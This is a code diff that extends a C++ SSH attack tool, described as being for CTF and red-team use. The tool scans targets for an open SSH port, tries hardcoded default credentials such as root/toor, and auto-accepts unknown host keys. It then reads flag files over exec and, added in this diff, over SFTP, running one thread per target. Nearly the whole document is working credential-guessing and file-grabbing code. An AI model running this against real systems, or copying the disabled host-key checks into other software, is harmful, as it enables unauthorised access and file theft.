@@ -1,17 +1,21 @@
 /* For authorized CTF/Red Team use only.
-To fix the compile error on macOS with Homebrew-installed libssh, ensure the correct include and library paths are specified. 
-For example:
+To fix the compile error on macOS with Homebrew-installed libssh (including SFTP support), ensure you install libssh with SFTP and use the correct include + library paths:
   brew install libssh
-g++ -std=c++11 -I/opt/homebrew/include -L/opt/homebrew/lib -lssh -o 22_ssh 22_ssh.cp*/
+  g++ -std=c++11 -I/opt/homebrew/include -L/opt/homebrew/lib -lssh -o 22_ssh 22_ssh.cpp
+*/
 
 #include <iostream>
 #include <string>
 #include <vector>
 #include <libssh/libssh.h>
+#include <libssh/sftp.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <fcntl.h>
+#include <thread>
+#include <mutex>
 
 bool verifyHostKey(const std::string& key) {
     return true;
@@ -20,7 +24,19 @@ bool verifyHostKey(const std::string& key) {
 bool enhancedVerifyHostKey(ssh_session session) {
     ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "rsa,dsa,ecdsa,ed25519");
     if (ssh_connect(session) != SSH_OK) return false;
-    return (ssh_is_server_known(session) == SSH_SERVER_KNOWN_OK);
+    int state = ssh_session_is_known_server(session);
+    if (state == SSH_KNOWN_HOSTS_OK) return true;
+    if (state == SSH_KNOWN_HOSTS_UNKNOWN || state == SSH_KNOWN_HOSTS_NOT_FOUND) {
+        ssh_key srv_pubkey = nullptr;
+        if (ssh_get_server_publickey(session, &srv_pubkey) == SSH_OK) {
+            if (ssh_session_update_known_hosts(session) == SSH_OK) {
+                ssh_key_free(srv_pubkey);
+                return true;
+            }
+            ssh_key_free(srv_pubkey);
+        }
+    }
+    return false;
 }
 
 std::string captureFlag(ssh_session session) {
@@ -50,6 +66,33 @@ std::string captureFlag(ssh_session session) {
     return "";
 }
 
+std::string captureFlagSFTP(ssh_session session) {
+    sftp_session sftp = sftp_new(session);
+    if (!sftp) return "";
+    if (sftp_init(sftp) != SSH_OK) {
+        sftp_free(sftp);
+        return "";
+    }
+    std::vector<std::string> paths = {"/flag","/home/ctf/flag.txt","/tmp/flag"};
+    for (auto &p : paths) {
+        sftp_file file = sftp_open(sftp, p.c_str(), O_RDONLY, 0);
+        if (!file) continue;
+        char buf[256];
+        std::string data;
+        int bytes;
+        while ((bytes = sftp_read(file, buf, sizeof(buf))) > 0) {
+            data.append(buf, bytes);
+        }
+        sftp_close(file);
+        if (!data.empty()) {
+            sftp_free(sftp);
+            return data;
+        }
+    }
+    sftp_free(sftp);
+    return "";
+}
+
 bool isSSHOpen(const std::string& ip) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) return false;
@@ -69,6 +112,30 @@ bool isSSHOpen(const std::string& ip) {
     return open;
 }
 
+void processTarget(const std::string& ip, const std::vector<std::pair<std::string,std::string>>& creds) {
+    if (!isSSHOpen(ip)) return;
+    ssh_session session = ssh_new();
+    if (!session) return;
+    ssh_options_set(session, SSH_OPTIONS_HOST, ip.c_str());
+    if (!enhancedVerifyHostKey(session)) {
+        ssh_free(session);
+        return;
+    }
+    for (auto &c : creds) {
+        if (ssh_userauth_password(session, c.first.c_str(), c.second.c_str()) == SSH_AUTH_SUCCESS) {
+            std::string flag = captureFlag(session);
+            if (flag.empty()) {
+                flag = captureFlagSFTP(session);
+            }
+            if (!flag.empty()) {
+                std::cout << "[*] Flag on " << ip << " (" << c.first << "): " << flag << std::endl;
+            }
+        }
+    }
+    ssh_disconnect(session);
+    ssh_free(session);
+}
+
 int main() {
     std::string serverKey = "some_unverified_key";
     if(verifyHostKey(serverKey)) {
@@ -80,25 +147,13 @@ int main() {
         {"testuser","testpassword"},
         {"root","toor"}
     };
+
+    std::vector<std::thread> threads;
     for (auto &ip : targets) {
-        if (!isSSHOpen(ip)) continue;
-        ssh_session session = ssh_new();
-        if (!session) continue;
-        ssh_options_set(session, SSH_OPTIONS_HOST, ip.c_str());
-        if (!enhancedVerifyHostKey(session)) {
-            ssh_free(session);
-            continue;
-        }
-        for (auto &c : creds) {
-            if (ssh_userauth_password(session, c.first.c_str(), c.second.c_str()) == SSH_AUTH_SUCCESS) {
-                std::string flag = captureFlag(session);
-                if (!flag.empty()) {
-                    std::cout << "[*] Flag on " << ip << " (" << c.first << "): " << flag << std::endl;
-                }
-            }
-        }
-        ssh_disconnect(session);
-        ssh_free(session);
+        threads.push_back(std::thread([&ip, &creds]() {
+            processTarget(ip, creds);
+        }));
     }
+    for (auto &t : threads) t.join();
     return 0;
 }
